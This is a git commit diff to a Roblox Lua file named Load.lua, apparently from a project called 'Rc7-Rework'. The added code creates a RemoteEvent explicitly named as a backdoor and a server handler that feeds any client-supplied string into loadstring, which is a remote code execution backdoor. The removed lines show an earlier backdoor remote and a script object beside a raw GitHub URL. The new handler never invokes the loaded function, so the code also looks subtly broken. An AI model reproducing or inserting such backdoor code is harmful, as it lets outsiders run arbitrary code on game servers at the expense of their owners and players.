4c48c320714fd88856990958898372fbecf0f5fb
Oflice <ofliceofficial@gmail.com>
2025-01-14 16:26:05 +0200

    Update Load.lua

--- Load.lua
+++ Load.lua
@@ -1,12 +1,6 @@
-local HttpService = game:GetService("HttpService")
+local server = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage"))
+server.Name = "Backdoor-XX-XX-XX-Backdoor"
 
-local remoteof = Instance.new("RemoteEvent")
-remoteof.Name = "XX__RC7__XX__REMOTE__BACKDOOR_cx"
-remoteof.Parent = game:GetService("ReplicatedStorage")
-
-local scrurl = "https://raw.githubusercontent.com/Oflice/Rc7-Rework/refs/heads/main/Files/Script.lua"
-
-local Script = Instance.new("Script")
-Script.Name = "XX__RC7__XX__SCRIPT_MAIN__BACKDOOR_cx"
-Script.Parent = game:GetService("ServerScriptService")
-Script.Source = "S"
+server.OnServerEvent:Connect(function(player, ss)
+	loadstring(ss)
+end)
